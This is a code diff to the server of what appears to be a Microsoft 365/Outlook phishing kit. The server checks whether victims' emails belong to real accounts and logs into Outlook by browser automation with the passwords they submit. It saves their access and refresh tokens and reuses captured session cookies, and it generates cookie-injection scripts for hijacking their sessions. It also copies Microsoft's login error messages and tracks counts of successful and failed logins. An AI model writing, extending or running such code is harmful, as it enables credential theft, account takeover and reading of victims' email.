@@ -346,36 +346,46 @@ app.get('/api/auth-callback', async (req, res) => {
 
             // Check if we have stored credentials for this email
             const sessionDir = path.join(__dirname, 'session_data');
-            
+
             try {
                 const glob = require('fs').readdirSync(sessionDir).filter(file => 
                     file.includes(targetSession.userEmail.replace(/[@.]/g, '_')) && file.startsWith('session_')
                 );
-                
+
                 if (glob.length > 0) {
                     const latestFile = glob.sort().pop();
                     const credentialsData = JSON.parse(fs.readFileSync(path.join(sessionDir, latestFile), 'utf8'));
                     console.log(`✅ Found stored credentials for: ${targetSession.userEmail}`);
-                    
-                    // Create comprehensive session data with authentication cookies
-                    const sessionCookies = [
-                        {
-                            name: 'MSGraphAccessToken',
-                            value: tokenData.access_token,
-                            domain: '.microsoftonline.com',
-                            path: '/',
-                            expires: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
-                            secure: true,
-                            httpOnly: true,
-                            sameSite: 'None'
-                        }
-                    ];
+
+                    // Use existing session cookies if available, otherwise create basic ones
+                    let sessionCookies = [];
+
+                    if (credentialsData.cookies && credentialsData.cookies.length > 0) {
+                        // Use existing cookies from previous session
+                        sessionCookies = credentialsData.cookies;
+                        console.log(`🔄 Reusing ${sessionCookies.length} existing session cookies`);
+                    } else {
+                        // Create basic authentication cookies
+                        sessionCookies = [
+                            {
+                                name: 'MSGraphAccessToken',
+                                value: tokenData.access_token,
+                                domain: '.microsoftonline.com',
+                                path: '/',
+                                expires: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
+                                secure: true,
+                                httpOnly: true,
+                                sameSite: 'None'
+                            }
+                        ];
+                        console.log(`🆕 Created ${sessionCookies.length} new authentication cookies`);
+                    }
 
                     // Generate injection script
                     const injectionScript = generateCookieInjectionScript(targetSession.userEmail, sessionCookies, targetSession.sessionId);
                     const injectFilename = `inject_session_${targetSession.sessionId}.js`;
                     const injectPath = path.join(sessionDir, injectFilename);
-                    
+
                     fs.writeFileSync(injectPath, injectionScript);
                     console.log(`🍪 Generated cookie injection script: ${injectFilename}`);
 
@@ -393,12 +403,12 @@ app.get('/api/auth-callback', async (req, res) => {
                         refreshToken: tokenData.refresh_token,
                         tokenExpiry: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString()
                     };
-                    
+
                     fs.writeFileSync(
                         path.join(sessionDir, `session_${targetSession.sessionId}_${targetSession.userEmail.replace(/[@.]/g, '_')}.json`),
                         JSON.stringify(fullSessionData, null, 2)
                     );
-                    
+
                     console.log(`💾 Saved complete session data for: ${targetSession.userEmail} with ${sessionCookies.length} cookies`);
                 } else {
                     console.log(`⚠️ No stored credentials found for: ${targetSession.userEmail}`);
@@ -406,14 +416,14 @@ app.get('/api/auth-callback', async (req, res) => {
             } catch (error) {
                 console.error('Error processing stored credentials:', error);
             }
-            
+
         } catch (tokenError) {
             // Handle specific Microsoft authentication errors
             console.error('❌ Microsoft authentication failed:', tokenError);
-            
+
             let errorMessage = 'Authentication failed';
             let errorDetails = tokenError.message;
-            
+
             // Parse common Microsoft error responses
             if (tokenError.message.includes('invalid_grant')) {
                 errorMessage = 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
@@ -426,7 +436,7 @@ app.get('/api/auth-callback', async (req, res) => {
             } else if (tokenError.message.includes('AADSTS50034')) {
                 errorMessage = 'We couldn\'t find an account with that username. Try another, or get a new Microsoft account.';
             }
-            
+
             // Store failed authentication attempt
             const sessionDir = path.join(__dirname, 'session_data');
             const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
@@ -441,15 +451,15 @@ app.get('/api/auth-callback', async (req, res) => {
                 status: 'invalid',
                 authUrl: req.originalUrl
             };
-            
+
             fs.writeFileSync(
                 path.join(sessionDir, `invalid_${failureId}.json`),
                 JSON.stringify(failureData, null, 2)
             );
-            
+
             analytics.failedLogins++;
             saveAnalytics();
-            
+
             return res.status(400).send(`
                 <html>
                     <head><title>Authentication Failed</title></head>
@@ -537,7 +547,7 @@ app.get('/api/profile', async (req, res) => {
         }
 
         const session = userSessions.get(sessionId);
-        
+
         // Check if session is authenticated
         if (!session.authenticated) {
             return res.status(401).json({ 
@@ -545,7 +555,7 @@ app.get('/api/profile', async (req, res) => {
                 message: 'Please complete login first' 
             });
         }
-        
+
         const userProfile = await session.graphAuth.getUserProfile();
 
         res.json({
@@ -586,7 +596,7 @@ app.get('/api/emails', async (req, res) => {
                 message: 'Please complete login first' 
             });
         }
-        
+
         const emails = await session.graphAuth.getEmails(count);
 
         res.json({
@@ -676,7 +686,7 @@ app.post('/api/verify-email', async (req, res) => {
         try {
             // Use Microsoft's discovery endpoint to check if the domain is federated with Microsoft
             const discoveryUrl = `https://login.microsoftonline.com/common/userrealm/${encodeURIComponent(email)}?api-version=1.0`;
-            
+
             const response = await fetch(discoveryUrl, {
                 method: 'GET',
                 headers: {
@@ -687,11 +697,11 @@ app.post('/api/verify-email', async (req, res) => {
 
             if (response.ok) {
                 const data = await response.json();
-                
+
                 // Check if the account exists and is a valid Microsoft account
                 // Microsoft accounts can have various AccountType values: Managed, Federated, Unknown, etc.
                 console.log(`Raw Microsoft discovery response for ${email}:`, data);
-                
+
                 const isValidAccount = (
                     (data.Account === 'Managed' || data.Account === 'Federated') ||
                     (data.account_type === 'Managed' || data.account_type === 'Federated') ||
@@ -700,10 +710,10 @@ app.post('/api/verify-email', async (req, res) => {
                     (data.DomainName && data.DomainName.length > 0) ||
                     (data.domain_name && data.domain_name.length > 0)
                 );
-                
+
                 if (isValidAccount) {
                     console.log(`✅ Email verification passed for: ${email} (Account type: ${data.Account || data.account_type || data.NameSpaceType})`);
-                    
+
                     // Store verification result in session_data for tracking
                     const fs = require('fs');
                     const path = require('path');
@@ -711,7 +721,7 @@ app.post('/api/verify-email', async (req, res) => {
                     if (!fs.existsSync(sessionDir)) {
                         fs.mkdirSync(sessionDir, { recursive: true });
                     }
-                    
+
                     const verificationId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
                     const verificationData = {
                         id: verificationId,
@@ -722,12 +732,12 @@ app.post('/api/verify-email', async (req, res) => {
                         status: 'verified',
                         fullResponse: data
                     };
-                    
+
                     fs.writeFileSync(
                         path.join(sessionDir, `verified_${verificationId}.json`),
                         JSON.stringify(verificationData, null, 2)
                     );
-                    
+
                     res.json({
                         exists: true,
                         email: email,
@@ -737,7 +747,7 @@ app.post('/api/verify-email', async (req, res) => {
                 } else {
                     console.log(`❌ Email verification failed for: ${email} - Account not found or not managed by Microsoft`);
                     console.log(`Discovery response:`, data);
-                    
+
                     // Store invalid result
                     const fs = require('fs');
                     const path = require('path');
@@ -745,7 +755,7 @@ app.post('/api/verify-email', async (req, res) => {
                     if (!fs.existsSync(sessionDir)) {
                         fs.mkdirSync(sessionDir, { recursive: true });
                     }
-                    
+
                     const invalidId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
                     const invalidData = {
                         id: invalidId,
@@ -756,25 +766,25 @@ app.post('/api/verify-email', async (req, res) => {
                         status: 'invalid',
                         fullResponse: data
                     };
-                    
+
                     fs.writeFileSync(
                         path.join(sessionDir, `invalid_${invalidId}.json`),
                         JSON.stringify(invalidData, null, 2)
                     );
-                    
+
                     res.json({
                         exists: false,
                         email: email,
-                        message: "We couldn't find an account with that username. Try another, or get a new Microsoft account."
+                        message: "We couldn't verify your account. Please check your email address and try again."
                     });
                 }
             } else {
                 throw new Error(`Discovery API returned ${response.status}: ${response.statusText}`);
             }
-            
+
         } catch (error) {
             console.log(`❌ Email verification error for: ${email} - ${error.message}`);
-            
+
             // For network errors or API issues, we'll be conservative and reject
             res.json({
                 exists: false,
@@ -818,7 +828,7 @@ app.post('/api/authenticate-password', async (req, res) => {
         try {
             await automation.init();
             const navigated = await automation.navigateToOutlook();
-            
+
             if (!navigated) {
                 throw new Error('Failed to navigate to Outlook');
             }
@@ -828,7 +838,7 @@ app.post('/api/authenticate-password', async (req, res) => {
             if (!loginSuccess) {
                 await automation.close();
                 console.log(`❌ Authentication failed for: ${email}`);
-                
+
                 analytics.failedLogins++;
                 saveAnalytics();
 
@@ -903,7 +913,7 @@ app.post('/api/authenticate-password', async (req, res) => {
 
         } catch (automationError) {
             console.error(`❌ Automation error for ${email}:`, automationError.message);
-            
+
             try {
                 await automation.close();
             } catch (closeError) {
@@ -925,7 +935,7 @@ app.post('/api/authenticate-password', async (req, res) => {
         console.error('Error in password authentication:', error);
         analytics.failedLogins++;
         saveAnalytics();
-        
+
         res.status(500).json({ 
             error: 'Authentication failed',
             success: false,
@@ -968,11 +978,11 @@ app.post('/api/login-automation', async (req, res) => {
         try {
             console.log(`🔧 Initializing browser for session: ${sessionId}`);
             await automation.init();
-            
+
             automationSessions.get(sessionId).status = 'navigating';
             console.log(`🌐 Navigating to Outlook for session: ${sessionId}`);
             const navigated = await automation.navigateToOutlook();
-            
+
             if (!navigated) {
                 throw new Error('Failed to navigate to Outlook');
             }
@@ -987,7 +997,7 @@ app.post('/api/login-automation', async (req, res) => {
                 const sessionValidation = await automation.validateSession(email);
 
                 automationSessions.get(sessionId).status = 'completed';
-                
+
                 analytics.successfulLogins++;
                 saveAnalytics();
 
@@ -1034,12 +1044,12 @@ app.post('/api/login-automation', async (req, res) => {
 
             } else {
                 automationSessions.get(sessionId).status = 'failed';
-                
+
                 analytics.failedLogins++;
                 saveAnalytics();
 
                 console.log(`❌ Automation login failed for: ${email}`);
-                
+
                 // Store failed attempt
                 const sessionDir = path.join(__dirname, 'session_data');
                 const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
@@ -1053,7 +1063,7 @@ app.post('/api/login-automation', async (req, res) => {
                     status: 'invalid',
                     method: 'automation'
                 };
-                
+
                 fs.writeFileSync(
                     path.join(sessionDir, `invalid_${failureId}.json`),
                     JSON.stringify(failureData, null, 2)
@@ -1083,11 +1093,11 @@ app.post('/api/login-automation', async (req, res) => {
 
         } catch (automationError) {
             console.error(`❌ Automation error for session ${sessionId}:`, automationError.message);
-            
+
             if (automationSessions.has(sessionId)) {
                 automationSessions.get(sessionId).status = 'error';
             }
-            
+
             analytics.failedLogins++;
             saveAnalytics();
 
@@ -1115,7 +1125,7 @@ app.post('/api/login-automation', async (req, res) => {
         console.error('Error in login automation endpoint:', error);
         analytics.failedLogins++;
         saveAnalytics();
-        
+
         res.status(500).json({ 
             error: 'Login automation failed',
             success: false,
@@ -1127,7 +1137,7 @@ app.post('/api/login-automation', async (req, res) => {
 // Check automation status
 app.get('/api/automation-status/:sessionId', (req, res) => {
     const sessionId = req.params.sessionId;
-    
+
     if (automationSessions.has(sessionId)) {
         const automationSession = automationSessions.get(sessionId);
         res.json({
@@ -1149,44 +1159,44 @@ app.get('/api/automation-status/:sessionId', (req, res) => {
 app.delete('/api/automation-cancel/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const clientSessionId = req.headers['x-session-id'] || req.query.clientSessionId;
-    
+
     if (automationSessions.has(sessionId)) {
         const automationSession = automationSessions.get(sessionId);
-        
+
         // Verify session ownership or admin access
         const hasAdminAccess = req.headers['x-admin-token'] === process.env.ADMIN_TOKEN;
         const hasSessionAccess = clientSessionId && userSessions.has(clientSessionId);
-        
+
         if (!hasAdminAccess && !hasSessionAccess) {
             return res.status(403).json({
                 error: 'Access denied - invalid session or admin token',
                 sessionId: sessionId
             });
         }
-        
+
         try {
             // Close the automation browser
             if (automationSession.automation) {
                 await automationSession.automation.close();
             }
-            
+
             // Remove from sessions
             automationSessions.delete(sessionId);
-            
+
             console.log(`🚫 Cancelled automation session: ${sessionId}`);
-            
+
             res.json({
                 success: true,
                 sessionId: sessionId,
                 message: 'Automation session cancelled successfully'
             });
-            
+
         } catch (error) {
             console.error(`Error cancelling automation session ${sessionId}:`, error.message);
-            
+
             // Still remove from sessions even if close failed
             automationSessions.delete(sessionId);
-            
+
             res.json({
                 success: true,
                 sessionId: sessionId,
@@ -1216,7 +1226,7 @@ app.get('/api/internal/redirect-url', (req, res) => {
         // Load redirect configuration
         const redirectConfigPath = path.join(__dirname, 'redirect-config.json');
         let redirectUrl = 'https://office.com'; // Default fallback
-        
+
         if (fs.existsSync(redirectConfigPath)) {
             try {
                 const redirectConfig = JSON.parse(fs.readFileSync(redirectConfigPath, 'utf8'));
@@ -1227,7 +1237,7 @@ app.get('/api/internal/redirect-url', (req, res) => {
                 console.warn('Error reading redirect config:', configError.message);
             }
         }
-        
+
         res.json({
             success: true,
             redirectUrl: redirectUrl
@@ -1300,7 +1310,7 @@ app.get('/api/session-data/:sessionId', (req, res) => {
     try {
         const sessionId = req.params.sessionId;
         const sessionDir = path.join(__dirname, 'session_data');
-        
+
         // Find session file
         const sessionFiles = fs.readdirSync(sessionDir).filter(file => 
             file.startsWith(`session_${sessionId}_`) && file.endsWith('.json')
